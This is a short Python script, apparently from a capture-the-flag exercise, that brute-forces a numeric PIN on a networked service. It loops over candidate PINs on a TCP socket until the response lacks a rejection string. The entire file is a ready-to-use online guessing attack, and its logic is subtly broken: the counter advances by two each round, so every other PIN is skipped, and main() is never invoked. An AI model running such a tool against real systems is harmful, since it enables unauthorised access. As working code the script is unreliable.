#!/usr/bin/python3
import socket
import argparse

#url="challenges.ctfd.io"
#chalport=30129


def create_conn_object(func_url, func_port):
    conn = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    conn.connect((func_url, int(func_port)))
    conn.recv(1024)
    return conn

def brute_force(conn_object, reject, pinlen):
    pin = make_pinv2(0, pinlen)
    while 1>0:
        pin_bytes = bytes(str(pin), "utf-8")
        conn_object.send(pin_bytes)
        data = conn_object.recv(1024)
        data_string = data.decode("utf-8")
        if reject not in data_string:
            print("FOUND PIN")
            print(str(pin))
            print(data_string)
            exit()
        else:
            pin = make_pinv2(int(pin)+1, pinlen)


def make_pinv2(current_pin, pinlength):
    new_pin = int(current_pin) + 1
    diff = int(pinlength) - len(str(new_pin))
    return str("0"*diff) + str(new_pin)


def arguments():
    parser = argparse.ArgumentParser(description='Brute Force a 4-8 digit PIN over network')
    parser.add_argument('--url', '-u', help='The url or IP with the service', required=True)
    parser.add_argument('--port', '-p', help='The port the service is on', required=True)
    parser.add_argument('--pin', '-l', help='The length of the PIN maximum of 8', default="4")
    parser.add_argument('--reject', '-r', help='The text returned when the incorrect PIN is entered', default="WRONG")
    return parser.parse_args()

def main():
    url = arguments().url
    portarg = arguments().port
    pinlength = arguments().pin
    reject_text = arguments().reject
    conn = create_conn_object(url, portarg)
    brute_force(conn, reject_text, pinlength)
